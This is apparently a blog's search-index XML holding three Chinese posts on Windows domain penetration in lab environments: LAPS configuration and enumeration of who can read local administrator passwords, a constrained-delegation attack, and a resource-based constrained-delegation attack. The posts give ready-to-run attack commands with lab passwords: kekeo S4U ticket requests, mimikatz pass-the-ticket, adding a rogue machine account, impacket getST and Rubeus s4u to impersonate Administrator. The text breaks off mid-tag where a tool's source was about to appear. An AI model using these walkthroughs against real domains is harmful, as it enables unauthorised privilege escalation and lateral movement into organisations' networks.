<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>组策略之LAPS</title>
      <link href="/2020/11/26/zu-ce-lue-zhi-laps/"/>
      <url>/2020/11/26/zu-ce-lue-zhi-laps/</url>
      
        <content type="html"><![CDATA[<h1 id="组策略之Local-Administrator-Password-Solution"><a href="#组策略之Local-Administrator-Password-Solution" class="headerlink" title="组策略之Local Administrator Password Solution"></a>组策略之Local Administrator Password Solution</h1><h2 id="0x00-LAPS介绍"><a href="#0x00-LAPS介绍" class="headerlink" title="0x00 LAPS介绍"></a>0x00 LAPS介绍</h2><p>介绍：</p><pre><code>将本地管理员密码存储在LDAP上，作为计算机账户的一个机密属性，配合GPO，实现自动定期修改密码、设置密码长度、强度等，然后配置某些指的账号，能查看存储的密码，如果用户需要，可以用PowerShell或指的工具查询密码，但对非授权用户，确无法获取，从而实现本机管理员的自动化管理。LAPS使用两个LDAP属性来存储本地管理员凭证，这两个属性分别是ms-MCS-AdmPwd（存储密码）和ms-MCS-AdmPwdExpirationTime（存储过期时间）。</code></pre><p>功能：</p><pre><code>如果配置不当，我们可以在域内一台普通主机，查看域内其他主机本地管理员账号LAPS解决方案的核心是GPO客户端扩展（CSE），它执行以下任务，并可以在GPO更新期间执行以下操作：检查本地Administrator帐户的密码是否已过期。当旧密码过期或需要在过期之前进行更改时，生成新密码。根据密码策略验证新密码。将密码报告给Active Directory，并将密码和机密属性一起存储在Active Directory中。将密码的下一个到期时间报告给Active Directory，并将该属性与计算机帐户的属性一起存储在Active Directory中。更改管理员帐户的密码。然后，允许这样做的用户可以从Active Directory中读取密码。合格的用户可以请求更改计算机的密码。计算机帐户只能写入/更新自己的本地管理员帐户密码（ms-Mcs-AdmPwd属性），而不能从该属性读取密码。可以轻松地为OU中的每台计算机更改密码。</code></pre><p>展示：</p><pre><code>laps再ldap的属性里：      ms-MCS-AdmPwd：存储密码      ms-MCS-AdmPwdExpirationTime：存储过期时间</code></pre><p>靶场环境介绍：</p><pre><code>测试环境:组织 OU：lapsComputers            MOTOO-IISWEB$           域机器组织 OU：lapsAdminUsers            lidan                   域用户组 group： lapsAdmins            lidan                   用户</code></pre><h2 id="0x01-域控创建组织lapsComputers和laspAdminUsers"><a href="#0x01-域控创建组织lapsComputers和laspAdminUsers" class="headerlink" title="0x01 域控创建组织lapsComputers和laspAdminUsers"></a>0x01 域控创建组织lapsComputers和laspAdminUsers</h2><p>创建组织OU</p><p><img src="/img/laps/06be0350-b9fc-4f70-8251-4b1943e29e92.png" alt="img"></p><p><img src="/img/laps/267ccd8a-efc5-482b-887f-206860d1d593.png" alt="img"></p><p><img src="/img/laps/afdccd17-1fb6-494a-abd1-c099e12466c5.png" alt="img"></p><p>成功将Motoo-IISWEB域机器加入到lapsComputers组织里</p><p><img src="/img/laps/a3cfe6ee-031e-43c0-9033-57aadea88a6d.png" alt="img"></p><p><img src="/img/laps/36550d89-2bfc-4a81-bd53-68e589320c10.png" alt="img"></p><p>同样创建组织OU：lapsAdminUsers</p><p>创建组：lapsAdmins</p><p>将liidan域用户加入到组织OU：lapsAdminUsers里，并且加入到组lapsAdmins</p><p><img src="/img/laps/88c58275-6c1e-44bd-8bc5-a9a205ea98c5.png" alt="img"></p><p>通过net user lidan /do可以看到在lapsAdmins组里</p><p><img src="/img/laps/40976aa6-3d48-43e1-b794-b3064c64010d.png" alt="img"></p><h2 id="0x02-安装LAPS"><a href="#0x02-安装LAPS" class="headerlink" title="0x02 安装LAPS"></a>0x02 安装LAPS</h2><p>域控安装laps</p><p><img src="/img/laps/c464ad27-67dc-42ec-9cd1-a77dcf5e68c9.png" alt="img"></p><p><img src="/img/laps/ffc755e3-cdc8-437f-814b-9d516ee3c6a1.png" alt="img"></p><p>扩展AD的架构</p><p>windows2008 的powershell版本是2.0，需要更新到3.0。才能导入Admpwd.ps</p><pre><code>Import-module AdmPwd.PSUpdate-AdmPwdADSchema</code></pre><p>使用Update-AdmPwdADSchema扩展架构</p><p><img src="/img/laps/cb3524f3-5066-4ac4-9368-28a2ee89be40.png" alt="img"></p><p>从活动目录中可以看到多出了这两个属性</p><p><img src="/img/laps/15054f83-f716-448a-96e0-3b9fa4a63729.png" alt="img"></p><p>查询lapsComputers这个OU的访问权限，可以看到目前只有域机器system权限和域管可以访问</p><pre><code>Find-AdmPwdExtendedRights -Identity lapsComputers | Format-Table -AutoSizeFind-AdmPwdExtendedRights -Identity &quot;OU=lapsComputers,DC=Motoo,DC=nc&quot; | Format-Table -AutoSize</code></pre><p><img src="/img/laps/2e624156-bdc6-494d-a2ea-73c1d5c367b7.png" alt="img"></p><p><img src="/img/laps/8e47f1c5-6c1f-44d1-bae3-21d9d27a2931.png" alt="img"></p><p>使用以下命令授予计算机修改本机ms-Mcs-AdmPwdExpirationTime 和 ms-Mcs-AdmPwd这两个扩展属性的权限。</p><pre><code>Set-AdmPwdComputerSelfPermission -OrgUnit lapsComputers</code></pre><p><img src="/img/laps/208df236-fd47-4f17-9fbf-fd8749c6dbcc.png" alt="img"></p><p>使用以下命令设置读取组织lapsComputers里的计算机扩展属性的权限组为lapsAdmins</p><pre><code>Set-AdmPwdReadPasswordPermission -OrgUnit lapsComputers -AllowedPrincipals lapsAdmins</code></pre><p><img src="/img/laps/87ccb97d-2d29-4329-ab22-c38707dac924.png" alt="img"></p><p>可以看到成功多了Motoo\lapsAdmins组</p><p><img src="/img/laps/46bd3eb0-d9d7-47fd-9d1e-82d8765870cd.png" alt="img"></p><p>使用以下命令设置重置密码的权限组为LAPAdmins</p><pre><code>Set-AdmPwdResetPasswordPermission -OrgUnit lapsComputers -AllowedPrincipals lapsAdmins</code></pre><p><img src="/img/laps/e71de080-08fa-48ff-b202-074440f24b9e.png" alt="img"></p><p><img src="/img/laps/d6fdfc9f-f28d-4a72-bb1b-119cfa21a7e6.png" alt="img"></p><h2 id="0x03-创建两条组策略链接到创建的OU上"><a href="#0x03-创建两条组策略链接到创建的OU上" class="headerlink" title="0x03 创建两条组策略链接到创建的OU上"></a>0x03 创建两条组策略链接到创建的OU上</h2><pre><code>lapsAdminUsers组织创建组策略install laps           目的：当lapsAdminUsers组织里的域用户登录时，通过组策略安装lapslapsComputers组织创建组策略set laps                目的：当域用户登陆后成功安装了laps后，通过组策略自动修改本地管理员密码</code></pre><p>打开域组策略gpmc.msc，启动组策略管理控制台，右键单击该域，然后单击“ 在此域中创建 GPO并在此处链接”。为GPO提供一个名称。</p><h3 id="0x03-1-lapsAdminUsers组织创建组策略install-laps"><a href="#0x03-1-lapsAdminUsers组织创建组策略install-laps" class="headerlink" title="0x03-1 lapsAdminUsers组织创建组策略install laps"></a>0x03-1 lapsAdminUsers组织创建组策略install laps</h3><p>在lapsAdminUsers的组织里新建一个组策略</p><p><img src="/img/laps/7f93f76b-9304-48e0-af0e-6490f265f358.png" alt="img"></p><p><img src="/img/laps/bd6a7356-251a-494e-a910-719c60f898fc.png" alt="img"></p><p>同时在\Motoo.nc\SYSVOL\Motoo.nc\Policies路径下多了该文件夹</p><p><img src="/img/laps/b1a91f02-8043-4602-bd57-1b8e369c4053.png" alt="img"></p><p>将laps安装包放到该文件夹下的Machine</p><p><img src="/img/laps/7d3aa3fc-2305-4ccc-a1d6-54d030a19ade.png" alt="img"></p><p>编辑组策略install laps</p><p><img src="/img/laps/1434a2e8-7f85-4edb-80ee-3257a03aad67.png" alt="img"></p><p>选择安装包</p><p><img src="/img/laps/513a7d0d-e34e-4024-9dc7-21bb5abc61f1.png" alt="img"></p><p>安装包只能是msi</p><p><img src="/img/laps/d07bfb9e-60ee-485d-b448-8d65947f2be9.png" alt="img"></p><p>选择指派</p><p><img src="/img/laps/571ee35d-2441-4d2a-ac70-9d8d63e024f6.png" alt="img"></p><p>成功指向共享文件里的msi安装包</p><p><img src="/img/laps/ec1b1ad8-8461-42df-b242-8ecc3f10727f.png" alt="img"></p><p>当域用户登录桌面的时候，就会自动安装。如果已经安装过了则不会再安装了。</p><p><img src="/img/laps/2cd9072a-effb-42b6-b969-bc0050cc12cf.png" alt="img"></p><h3 id="0x03-2-lapsComputers组织创建组策略set-laps"><a href="#0x03-2-lapsComputers组织创建组策略set-laps" class="headerlink" title="0x03-2 lapsComputers组织创建组策略set laps"></a>0x03-2 lapsComputers组织创建组策略set laps</h3><p><img src="/img/laps/cf3cc113-ebfa-454a-b61b-0d2c2cc6d4c9.png" alt="img"></p><p><img src="/img/laps/aec206ed-3731-4aa9-92f3-cf923602ef3c.png" alt="img"></p><p>密码的设置，提供了多种复杂度的组合方式、密码长度和密码重置周期的设置。</p><p><img src="/img/laps/4f7b9405-b011-4bf7-9660-bad685319716.png" alt="img"></p><p>接下来是输入本地管理员的用户名,如果你修改的不是内置的Administrator，请在这里指定你希望修改的用户名，在未配置的情况下默认为内置的Administrator。</p><p><img src="/img/laps/854d33f5-65af-417d-aec4-fd69c110b398.png" alt="img"></p><p>接下来这一项是为了重置周期与密码有效期策略配合使用的设置。因为很多公司都有自己的密码过期策略，启用这一项可以避免两个配置发生冲突。</p><p><img src="/img/laps/1c6887c6-d170-4a51-af85-bf36c120191d.png" alt="img"></p><p>最后一项启用配置后确认对本地管理员密码开始进行设置。</p><p><img src="/img/laps/92bdc0aa-6729-469a-a184-e26a4c5f6003.png" alt="img"></p><h2 id="0x04-通过ldap查看laps的明文密码"><a href="#0x04-通过ldap查看laps的明文密码" class="headerlink" title="0x04 通过ldap查看laps的明文密码"></a>0x04 通过ldap查看laps的明文密码</h2><p>使用lapsAdminUsers组织里的lapsAdmins组里的成员lidan登录lapsComputers机器</p><p>可以看到登陆的时候显示正在安装laps</p><p><img src="/img/laps/7bbc7e74-12fc-4926-9ccb-cee566fcf8bb.png" alt="img"></p><p>通过lidan域用户或者域管用户查看ldap，选择lapsComputers里的域机器，可以看到本地管理员administrator的随机明文密码</p><p><img src="/img/laps/390f5927-8b8a-4b7e-9d47-47af4a0c3c5a.png" alt="img"></p><p>如果使用非lapsAdminsUsers组织lapsAdmins组里的域用户查看ldap，是看不到的密码的，只能看到是什么时候修改的</p><p><img src="/img/laps/536d59df-46a1-4ad5-8d67-d43f085ec333.png" alt="img"></p><h2 id="0x05-漏洞利用"><a href="#0x05-漏洞利用" class="headerlink" title="0x05 漏洞利用"></a>0x05 漏洞利用</h2><h3 id="0x05-1-grouper2-导出组策略"><a href="#0x05-1-grouper2-导出组策略" class="headerlink" title="0x05-1 grouper2 导出组策略"></a>0x05-1 grouper2 导出组策略</h3><p>当我们遇到域环境时，先通过grouper2导出组策略看是否有laps</p><p>Grouper2.exe -d Motoo.nc -u liwei -p 1qaz@WSX -t 100 -f out.html</p><p><img src="/img/laps/1a93bd96-83b2-4d88-9fa9-ec4d9e8bd3d4.png" alt="img"></p><p>打开out.html，全局搜索laps</p><p><img src="/img/laps/005342bb-0a41-40bb-b3d2-f62d36aafb3c.png" alt="img"></p><p>通过uid可以找到laps链接到哪个组织</p><p><img src="/img/laps/3c6d0c63-2aab-413a-acf1-9a95ddd7f000.png" alt="img"></p><h3 id="0x05-2-LAPSTOOlkit工具寻找laps漏洞"><a href="#0x05-2-LAPSTOOlkit工具寻找laps漏洞" class="headerlink" title="0x05-2 LAPSTOOlkit工具寻找laps漏洞"></a>0x05-2 LAPSTOOlkit工具寻找laps漏洞</h3><pre><code>github : https://github.com/leoloobeek/LAPSToolkit/archive/master.zip显示全部启用了LAPS和密码扩展的计算机设备。get-help Get-LAPSComputers查询所有的OU并检测哪一个活动目录组可读取ms-Mcs-AdmPwd属性。get-help Find-LAPSDelegatedGroups       使用了get-NetOU针对每一个启用了LAPS的活动目录计算机，进行扩展权限分析，并查找哪一个用户组拥有AD读取权限，以及其中的用户是否具有“全部扩展权限”。系统管理员可能不知道哪一个具有“全部扩展权限”的用户可以查看密码，以及用户组中的哪一个用户安全等级比较低。这个功能可以针对每一个AD设备解析ACL权限，但对于范围比较大的域，解析时间会比较久。get-help Find-AdmPwdExtendedRights      使用了get-objectAcl原理​```Get-NetComputer -ComputerName &#39;LAPSCLIENT.test.local&#39; -FullData |Select-Object -ExpandProperty distinguishedname |ForEach-Object { $_.substring($_.indexof(&#39;OU&#39;)) } | ForEach-Object {  Get-ObjectAcl -ResolveGUIDs -DistinguishedName $_} | Where-Object {  ($_.ObjectType -like &#39;ms-Mcs-AdmPwd&#39;) -and  ($_.ActiveDirectoryRights -match &#39;ReadProperty&#39;)} | ForEach-Object {  Convert-NameToSid $_.IdentityReference} | Select-Object -ExpandProperty SID | Get-ADObject​```首先，我们将获取Get-NetComputer -FullData的完整数据对象。然后，我们提取并扩展 distinguishedname属性，找到“ OU”的索引，然后仅返回字符串的该部分。我们在这里所做的只是枚举特定计算机所属的OU。接下来，我们使用Get-ObjectAcl枚举该指定OU的ACL， 并使用-ResolveGUIDs将GUID解析为通用显示名称。然后，我们过滤权限条目，仅返回那些在ms-Mcs-AdmPwd字段上包含读取权限的条目 。我们无法确定从IdentityReference字段返回的名称 是组还是用户，因此我们可以使用PowerView的 Convert-NameToSid cmdlet将对象转换为直接安全标识符（SID），然后将其最终传递给 Get -ADObject返回具有对该字段的读取权限的完整活动目录用户/组对象。从结果中我们可以看到，“ LAPS_recover”域组被授予读取权限。现在，如果我们想枚举所有LAPS应用程序，并且谁拥有对它们的读取权限，该怎么办？由于最近对Get-ObjectACL的参数流水线进行了一些优化，因此比以往任何时候都更容易​```Get-NetOU -FullData | Get-ObjectAcl -ResolveGUIDs | Where-Object {  ($_.ObjectType -like &#39;ms-Mcs-AdmPwd&#39;) -and   ($_.ActiveDirectoryRights -match &#39;ReadProperty&#39;)} | ForEach-Object {  $_ | Add-Member NoteProperty &#39;IdentitySID&#39; $(Convert-NameToSid $_.IdentityReference).SID;  $_}​```</code></pre><p>查询哪些机器使用了laps</p><pre><code>Get-LAPSComputers</code></pre><p><img src="/img/laps/69a50a66-840f-4f70-af87-19189c50f8dd.png" alt="img"></p><p>查询所有的OU并检测哪一个活动目录组可读取ms-Mcs-AdmPwd属性。</p><pre><code>import-module .\LAPSToolkit.ps1Find-LAPSDelegatedGroups</code></pre><p><img src="/img/laps/4775375f-394e-4877-adbb-ffcde56bf976.png" alt="img"></p><p><strong>从上图结果得知，lapsAdmins组里的用户可以读取lapsComputers组织里的所有域机器的本地管理员密码</strong></p><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><pre><code>http://drops.xmd5.com/static/drops/tips-10496.htmlhttp://tech.canway.net/news/164.htmlhttp://www.harmj0y.net/blog/powershell/running-laps-with-powerview/</code></pre>]]></content>
      
      
      <categories>
          
          <category> 域渗透 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> LAPS </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>约束委派利用</title>
      <link href="/2020/11/25/yue-shu-wei-pai-li-yong/"/>
      <url>/2020/11/25/yue-shu-wei-pai-li-yong/</url>
      
        <content type="html"><![CDATA[<h1 id="0x09-约束委派利用"><a href="#0x09-约束委派利用" class="headerlink" title="0x09-约束委派利用"></a>0x09-约束委派利用</h1><h2 id="0x01-准备工作"><a href="#0x01-准备工作" class="headerlink" title="0x01 准备工作"></a>0x01 准备工作</h2><h3 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h3><pre><code>《AD域用户加域委派》https://wenku.baidu.com/view/5cd12c2adc36a32d7375a417866fb84ae45cc32b.html《域渗透——Kerberos委派攻击》     -- 主要是这篇文章https://xz.aliyun.com/t/7217#toc-9《利用域委派获取域管理权限》https://www.anquanke.com/post/id/92484《微软不认的“0day”之域内本地提权-烂番茄（Rotten Tomato）》https://mp.weixin.qq.com/s/Ue2ULu8vxYHrYEalEzbBSw《这是一篇“不一样”的真实渗透测试案例分析文章》https://cloud.tencent.com/developer/article/1601095</code></pre><h3 id="准备环境"><a href="#准备环境" class="headerlink" title="准备环境"></a>准备环境</h3><pre><code>借用Klion的环境域控：192.168.3.142域机器：Srv-DB-0day域机器：PC-jerry-0day服务账号:0day\sqlsvr Admin12345工具：ADFind.exe      查找域中配置约束委派用户kekeo.exe       请求TGT，获取STmimikatz        导入ST，获取权限</code></pre><h3 id="背景知识"><a href="#背景知识" class="headerlink" title="背景知识"></a>背景知识</h3><p>域委派是指将域内用户的权限委派给服务账号，使得服务账号能以用户的权限在域内展开活动</p><p>委派主要分为非约束委派(Unconstrained delegation)和约束委派(Constrained delegation)两个方式，还有一种是基于资源的约束委派（Resource Based Constrained Delegation）</p><pre><code>非约束性委派（Unconstrained Delegation）服务账号可以获取某用户的TGT，从而服务账号可使用该TGT，模拟用户访问任意服务。举例说明，如果某个服务A的服务账号B被设置为非约束委派，当用户C通过Kerberos认证访问服务A时，KDC会检查服务账号B的属性，发现是非约束性委派时，KDC会将用户C的TGT放在TGS中，这样B在验证TGS的同时获取了A用户的TGT，从而可以模拟用户A访问任意服务。从网络攻击的角度看，如果攻击者控制了服务账号B，并诱骗管理员来访问服务A，则可以获取管理员的TGT，进而模拟管理员访问任意服务，即获得管理员权限。越是大型网络、应用越多的网络，服务账号越多，委派的应用越多，越容易获取域管理员权限。</code></pre><pre><code>约束性委派（Constrained Delegation）即Kerberos的扩展协议S4U2Proxy，服务账号只能获取某用户的TGS，从而只能模拟用户访问特定的服务；</code></pre><h3 id="服务账号、主机账号、普通账号"><a href="#服务账号、主机账号、普通账号" class="headerlink" title="服务账号、主机账号、普通账号"></a>服务账号、主机账号、普通账号</h3><p>在Windows系统中，普通用户的属性中没有委派（Delegation）这个选项卡，只有服务账号、主机账号才有。</p><p>服务账号（Service Account），域内用户的一种类型，服务器运行服务时所用的账号，将服务运行起来并加入域。例如MS SQL Server在安装时，会在域内自动注册服务账号SqlServiceAccount，这类账号不能用于交互式登录。</p><p>服务账号：⬇</p><p><img src="/img/delegation/2a7151ab-7283-4ec3-bb6d-61b1da116eba.png" alt="img"></p><p>主机账号：⬇</p><p><img src="/img/delegation/862a6496-aa6d-4e53-89c0-915a769c5848.png" alt="img"></p><p>普通账号：⬇</p><p><img src="/img/delegation/368b1b91-3985-4ec8-9b95-7b09c1b431ec.png" alt="img"></p><h2 id="0x02-约束委托利用"><a href="#0x02-约束委托利用" class="headerlink" title="0x02 约束委托利用"></a>0x02 约束委托利用</h2><p>模拟环境，在域机器：PC-jerry-0day上</p><h3 id="1-查找域中配置约束委派用户"><a href="#1-查找域中配置约束委派用户" class="headerlink" title="1. 查找域中配置约束委派用户"></a>1. 查找域中配置约束委派用户</h3><pre><code>AdFind.exe -h 192.168.3.142 -u sqlsvr -up Admin12345 -b &quot;DC=0day,DC=org&quot; -f &quot;(&amp;(samAccountType=805306368)(msds-allowedtodelegateto=*))&quot; cn distinguishedName msds-allowedtodelegateto</code></pre><p><img src="/img/delegation/c655de04-feac-4072-96ed-1cb59df6970d.png" alt="img"></p><p>那么当我们获取了sqlsvr域用户的账号密码后，就可以登录查出来的任意域机器</p><p>先查询下Srv-DB-0day域机器的管理组，使用服务账号建立IPC连接，用local查询本地管理组。可以看到sqlsvr并不能对Srv-DB-0day域机器有操作权限</p><p><img src="/img/delegation/ffe5a7ac-d47b-464f-8e7c-97ef90400c13.png" alt="img"></p><h3 id="2-用kekeo请求该用户的TGT，使用这张TGT获取域机器的ST"><a href="#2-用kekeo请求该用户的TGT，使用这张TGT获取域机器的ST" class="headerlink" title="2. 用kekeo请求该用户的TGT，使用这张TGT获取域机器的ST"></a>2. 用kekeo请求该用户的TGT，使用这张TGT获取域机器的ST</h3><pre><code>kekeo.exetgt::ask /user:sqlsvr /domain:0day.org /password:Admin12345 /ticket:administrator.kirbitgs::s4u /tgt:TGT_sqlsvr@0DAY.ORG_krbtgt~0day.org@0DAY.ORG.kirbi /user:Administrator@0day.org /service:cifs/Srv-DB-0day.0day.org</code></pre><p>用kekeo请求该用户的TGT</p><p>tgt::ask /user:sqlsvr /domain:0day.org /password:Admin12345 /ticket:administrator.kirbi</p><p>/user: 服务用户的用户名</p><p>/password: 服务用户的明文密码</p><p>/domain: 所在域名</p><p>/ticket: 指定票据名称，不过这个参数没有生效，可以忽略</p><p>得到服务用户TGT：<a href="mailto:TGT_sqlsvr@0DAY.ORG_krbtgt" target="_blank" rel="noopener">TGT_sqlsvr@0DAY.ORG_krbtgt</a>~0day.org@0DAY.ORG.kirbi</p><p>使用这张TGT通过伪造s4u请求以administrator用户身份请求访问Srv-DB-0day CIFS的ST</p><p>tgs::s4u /tgt:<a href="mailto:TGT_sqlsvr@0DAY.ORG_krbtgt" target="_blank" rel="noopener">TGT_sqlsvr@0DAY.ORG_krbtgt</a>~0day.org@0DAY.ORG.kirbi /user:<a href="mailto:Administrator@0day.org" target="_blank" rel="noopener">Administrator@0day.org</a> /service:cifs/Srv-DB-0day.0day.org</p><p>S4U2Self获取到的ST1以及S4U2Proxy获取到的Srv-DB-0day CIFS服务的ST2会保存在当前目录下</p><p><img src="/img/delegation/3856b471-3f77-4497-a05e-d108b3082d2c.png" alt="img"></p><p><img src="/img/delegation/0660e189-5f7a-4c7b-882d-2614b32a8c81.png" alt="img"></p><h3 id="3-获取权限"><a href="#3-获取权限" class="headerlink" title="3. 获取权限"></a>3. 获取权限</h3><p>使用mimikatz将ST2导入当前会话即可，如果有杀软，自行免杀。需要以管理员权限运行mimikatz</p><pre><code>kerberos::ptt TGS_Administrator@0day.org@0DAY.ORG_cifs~Srv-DB-0day.0day.org@0DAY.ORG.kirbidir \\Srv-DB-0day.0day.org\C$\</code></pre><p><img src="/img/delegation/78714f9a-a23b-428c-a1e5-7b1fae22aa80.png" alt="img"></p><h2 id="0x03-视频演示"><a href="#0x03-视频演示" class="headerlink" title="0x03 视频演示"></a>0x03 视频演示</h2><p><img src="/img/delegation/%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE%E5%88%A9%E7%94%A8%E8%BF%87%E7%A8%8B.gif" alt="img"></p>]]></content>
      
      
      <categories>
          
          <category> 域渗透 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 约束委派利用 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>基于资源的约束委派利用</title>
      <link href="/2020/11/25/ji-yu-zi-yuan-de-yue-shu-wei-pai-li-yong/"/>
      <url>/2020/11/25/ji-yu-zi-yuan-de-yue-shu-wei-pai-li-yong/</url>
      
        <content type="html"><![CDATA[<h1 id="0x09-基于资源的约束委派利用"><a href="#0x09-基于资源的约束委派利用" class="headerlink" title="0x09 基于资源的约束委派利用"></a>0x09 基于资源的约束委派利用</h1><h2 id="0x01-应用场景："><a href="#0x01-应用场景：" class="headerlink" title="0x01 应用场景："></a>0x01 应用场景：</h2><p>​    在大型内网域环境中，将机器加入到域环境中一般不会用域管权限，而是用一个专门加域的域用户去操作。那么当我们拿下该域用户的账号密码时，就可以把通过该域用户加入到域里的所有机器都拿下。</p><p>0.限制：只能在windows 2012及以上版本的域控才可以，因为08及以下的域控没有msDS-AllowedToActOnBehalfOfOtherIdentity这个属性</p><p><img src="/img/delegation/70ffc507-8f02-4621-8811-a8050fd47030.png" alt="img"></p><p><img src="/img/delegation/507dd4fe-2571-40b6-9d6b-9cb0cd441e2c.png" alt="img"></p><p>\1. 提权：当我们钓鱼拿下一台员工机器，发现是在域里面的，然后在电脑里发现addUser域用户的账号密码，因为需要addUser域用户将员工机器加入到域环境里，所以有可能会获得到addUser的账号密码。然后发现当前域用户并不在本地管理组里，就可以通过addUser域用户提权到adminsitrator。</p><p>\2. 横向拓展：在hack域中，addUser域用户负责将员工lm的机器或者web服务器web2008等机器加入到hack域里，那么当我们拿下addUser这个域用户的权限后，就可以拿下员工lm的机器和web服务器web2008。</p><p>环境模拟</p><pre><code>hack域角色            IP                    主机名                     服务器类型dc:         192.168.52.2        windows_server_2016_dc          windows2016web:        192.168.52.8        web2008                         windows2008pc:         192.168.52.30       win7-pc                         windows07domain user：    addUser     P@ssw0rd        加域账号</code></pre><p>web2008 和 win7-pc 是由addUser域用户(addUser不是域管)加入到域环境里成为域机器，但是addUser并不是web2008|win7-pc 域机器的本地管理组成员。</p><p>win7-pc域机器的信息：模拟内网里的员工电脑</p><ol><li><p>当前用户是lm域用户，但是lm域用户不是本地管理员成员。</p></li><li><p>由addUser域用户加入到域里，但是addUser域用户不是win7-pc域机器的本地管理组</p></li></ol><p><img src="/img/delegation/4c1cf92d-d0e9-4934-af7b-aa8f4c941342.png" alt="img"></p><p>web2008域机器的信息：模拟内网的web服务</p><ol><li>由addUser域用户加入到域里，但是addUser域用户不是web2008域机器的本地管理组</li></ol><p><img src="/img/delegation/8cc84979-fbf5-458b-9cc0-c44e97ffb712.png" alt="img"></p><h2 id="0x02-利用："><a href="#0x02-利用：" class="headerlink" title="0x02 利用："></a>0x02 利用：</h2><p>只要获取到加域账号就可以。</p><h3 id="0x02-1-寻找加域账号"><a href="#0x02-1-寻找加域账号" class="headerlink" title="0x02-1 寻找加域账号"></a>0x02-1 寻找加域账号</h3><pre><code>查询ACL：powerview的脚本，IdentityReference：域用户，ObjectDN：域机器，ActiveDirectoryRights：权限Get-ObjectAcl -ADSprefix &quot;CN=Computers&quot; |select IdentityReference,ObjectDN,ActiveDirectoryRights查询每个域机器是由哪个域用户添加进域的,通过mS-DS-CreatorSID查看域用户的sidAdFind.exe -h 192.168.52.2 -u lm -up Lm123*** -b &quot;DC=hack,DC=local&quot; -f &quot;objectClass=computer&quot; mS-DS-CreatorSID</code></pre><p><img src="/img/delegation/ba988274-ed8f-45ea-8e55-d4de3ea3b57c.png" alt="img"></p><p><img src="/img/delegation/e08d6cb2-30b6-4932-a1cc-11148660d453.png" alt="img"></p><pre><code>dn:CN=WEB2008,CN=Computers,DC=hack,DC=local&gt;mS-DS-CreatorSID: S-1-5-21-675002476-827761145-2127888524-1619sid2user.exe \\192.168.52.2 5 21 675002476 827761145 2127888524 1619Name is addUserDomain is HACKType of SID is SidTypeUser</code></pre><p>查WEB2008是由哪个域用户加入到域机器里的</p><p><img src="/img/delegation/068eed09-8d37-4579-a047-ed583f6b3fe1.png" alt="img"></p><p>此时找到了域里的加域账号addUser</p><h3 id="0x02-2-横向拓展"><a href="#0x02-2-横向拓展" class="headerlink" title="0x02-2 横向拓展"></a>0x02-2 横向拓展</h3><p>假设拿到了addUser用户，尝试和web2008建立ipc连接，发现并没有权限。</p><p><img src="/img/delegation/a90d3bbb-4568-48e7-9b43-9c4b27124437.png" alt="img"></p><p>使用addUser域用户添加一个域机器账户evilpc，机器账户的密码是123456，并且对web2008域机器配置msDS-AllowedToActOnBehalfOfOtherIdentity属性</p><pre><code>Addnew_MachineAccount.exe 域控IP 域的名字 域用户名 域用户密码 目标机器Addnew_MachineAccount.exe 192.168.52.2 hack.local addUser P@ssw0rd web2008</code></pre><p><img src="/img/delegation/ad8a188f-a8c5-414d-bdcf-ed3d42d46200.png" alt="img"></p><p><img src="/img/delegation/145fd8f2-7e80-4000-91ae-9f46e968c36f.png" alt="img"></p><p><img src="/img/delegation/99473ef7-2795-4101-8d78-8d7c458d88ae.png" alt="img"></p><p>使用impacket的getST生成票据，会在当前目录下生成administrator.ccache文件</p><p>目标机器安装impacket有点不现实，所以可以使用socks代理生成票据</p><pre><code>getST.py -dc-ip 192.168.52.2 hack.local/evilpc\$:123456 -spn cifs/web2008.hack.local -impersonate administrator</code></pre><p><img src="/img/delegation/8da00ed8-598a-44f7-bac1-01c95f402f10.png" alt="img"></p><p>使用mimikatz导入票据</p><pre><code>kerberos::ptc 票据kerberos::ptc C:\Users\lm\Desktop\administrator.ccache</code></pre><p><img src="/img/delegation/27454634-c24c-4ea5-86ca-62cc6ee44625.png" alt="img"></p><pre><code>klist           查询票据klist purge     清空票据</code></pre><p><img src="/img/delegation/568c02c8-3a1d-4953-8cfe-a8c769bd3eee.png" alt="img"></p><p>成功获取权限，切记，这里一定要是web2008.hack.local，只是web2008是没有权限的</p><p><img src="/img/delegation/7e7145a8-9dd9-4f01-9561-f663ba59835f.png" alt="img"></p><p>删除票据后，就没有权限了</p><p><img src="/img/delegation/2d9bf118-abaa-4b8d-9881-f820f96b5d2b.png" alt="img"></p><p>或者可以尝试用Rubeus生成票据，但是本地失败了。</p><p>计算域机器evilpc$的hash</p><pre><code>Rubeus.exe hash /user:evilpc$ /password:123456 /domain:hack.local</code></pre><p><img src="/img/delegation/f80b6fdf-3128-407b-b2f7-7df3ccf91c70.png" alt="img"></p><pre><code>Rubeus.exe s4u /user:evilpc$ /rc4:32ED87BDB5FDC5E9CBA88547376818D4 /impersonateuser:administrator /msdsspn:cifs/web2008 /pttRubeus.exe s4u /user:evilpc$ /rc4:32ED87BDB5FDC5E9CBA88547376818D4 /impersonateuser:administrator /msdsspn:host/web2008 /ptt</code></pre><p><img src="/img/delegation/15ab3eb5-a043-41af-9973-aad8dc74be25.png" alt="img"></p><p><img src="/img/delegation/667b5baa-1fe6-44f1-a3c9-b631c6c193c9.png" alt="img"></p><h2 id="0x03-参考链接"><a href="#0x03-参考链接" class="headerlink" title="0x03 参考链接"></a>0x03 参考链接</h2><pre><code>https://mp.weixin.qq.com/s/Ue2ULu8vxYHrYEalEzbBSwhttps://xz.aliyun.com/t/7454#toc-1https://xz.aliyun.com/t/7217#toc-0https://3gstudent.github.io/3gstudent.github.io/%E5%9F%9F%E6%B8%97%E9%80%8F-AdminSDHolder/  查询aclhttps://www.cnblogs.com/simon7s/p/12370183.htm  mimikatz导入ccache票据</code></pre><h2 id="0x04-Addnew-MachineAccount-源码"><a href="#0x04-Addnew-MachineAccount-源码" class="headerlink" title="0x04 Addnew_MachineAccount 源码"></a>0x04 Addnew_MachineAccount 源码</h2><p>Addnew_MachineAccount.exe源码，使用C#编译</p><p><img 